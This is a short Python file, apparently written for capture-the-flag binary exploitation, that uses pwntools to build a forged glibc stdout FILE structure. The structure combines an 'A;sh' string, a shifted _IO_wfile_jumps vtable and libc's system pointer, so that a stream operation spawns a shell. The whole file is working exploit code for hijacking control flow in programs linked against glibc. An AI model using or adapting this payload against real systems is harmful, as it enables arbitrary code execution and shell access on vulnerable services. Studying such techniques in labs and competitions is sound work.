from pwn import ELF
from pwn import p8, p16, p32, p64

def inline_stdout(libc: ELF):
    wide_data = libc.sym._IO_2_1_stdout_

    loc = libc.bss() + 0x400 & ~0xff

    fake = bytearray()
    fake += p32(0xfbad6105)                      # flags
    fake += b"A;sh"                                     # 4 byte hole
    fake += p64(loc)                             # _IO_read_ptr
    fake += p64(loc)                             # _IO_read_end
    fake += p64(loc)                             # _IO_read_base
    fake += p64(0)                               # _IO_write_base
    fake += p64(loc)                             # _IO_write_ptr
    fake += p64(loc)                             # _IO_write_end
    fake += p64(0)                               # _IO_buf_base
    fake += p64(loc)                             # _IO_buf_end
    fake += p64(0) * 3                           # _IO_save_base, _IO_backup_base, _IO_save_end
    fake += p64(0)                               # _markers
    fake += p64(0)                               # _chain
    fake += p32(1)                               # _fileno
    fake += p32(0)                               # _flags2
    fake += p64((1 << 64) - 1)                   # _old_offset
    fake += p16(0)                               # _cur_column
    fake += p8(0)                                # _vtable_offset 
    fake += p8(0)                                # _shortbuf
    fake += p32(0)                               # 4 byte hole
    fake += p64(libc.sym._IO_stdfile_1_lock)     # _lock
    fake += p64((1 << 64) - 1)                   # _offset
    fake += p64(0)                               # _codecvt
    fake += p64(wide_data)                       # _wide_data
    fake += p64(0)                               # _freeres_list
    fake += p64(0)                               # _prevchain
    fake += p32(0)                               # _mode
    fake += b"\x00" * 20                                # _unused2
    fake += p64(libc.sym._IO_wfile_jumps - 0x20) # vtable
    fake += p64(wide_data)                       # _wide_vtable

    fake[0x68:0x68+8] = p64(libc.sym.system)
    return fake